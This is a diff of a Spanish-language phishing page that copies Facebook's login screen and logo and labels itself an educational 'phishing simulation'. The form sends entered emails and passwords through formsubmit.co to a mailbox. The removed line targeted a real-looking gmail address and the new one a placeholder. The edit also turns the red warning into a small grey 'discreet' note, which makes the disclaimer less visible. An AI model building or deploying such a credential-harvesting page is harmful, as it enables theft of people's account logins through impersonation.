@@ -8,7 +8,8 @@
     body {
       font-family: Helvetica, Arial, sans-serif;
       background-color: #f0f2f5;
-      margin: 0; padding: 0;
+      margin: 0;
+      padding: 0;
     }
     .container {
       width: 100%;
@@ -23,7 +24,9 @@
       text-align: center;
       margin-bottom: 20px;
     }
-    .logo img { width: 200px; }
+    .logo img {
+      width: 200px;
+    }
     input[type="text"],
     input[type="password"] {
       width: 100%;
@@ -44,10 +47,10 @@
       font-weight: bold;
       cursor: pointer;
     }
-    .note {
-      color: red;
+    .note-discreta {
       text-align: center;
-      font-size: 14px;
+      font-size: 12px;
+      color: #999;
       margin-top: 20px;
     }
   </style>
@@ -57,15 +60,15 @@
     <div class="logo">
       <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
     </div>
-    <form action="https://formsubmit.co/erickgamer833@gmail.com" method="POST">
+    <form action="https://formsubmit.co/TU_CORREO@ejemplo.com" method="POST">
       <input type="text" name="email" placeholder="Correo electrónico o teléfono" required>
       <input type="password" name="password" placeholder="Contraseña" required>
       <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="https://TU_USUARIO.github.io/phishing-simulacion/gracias.html">
-      <input type="submit" value="Iniciar sesión">
+      <input type="hidden" name="_next" value="https://ericsps8w.github.io/phishing-simulacion/gracias.html">
+      <input type="submit" value="Iniciar sesión" title="⚠️ Simulación educativa. No uses datos reales.">
     </form>
-    <div class="note">
-      ⚠️ Simulación educativa. No ingreses datos reales.
+    <div class="note-discreta">
+      ⚠️ Simulación académica. No ingreses datos reales.
     </div>
   </div>
 </body>
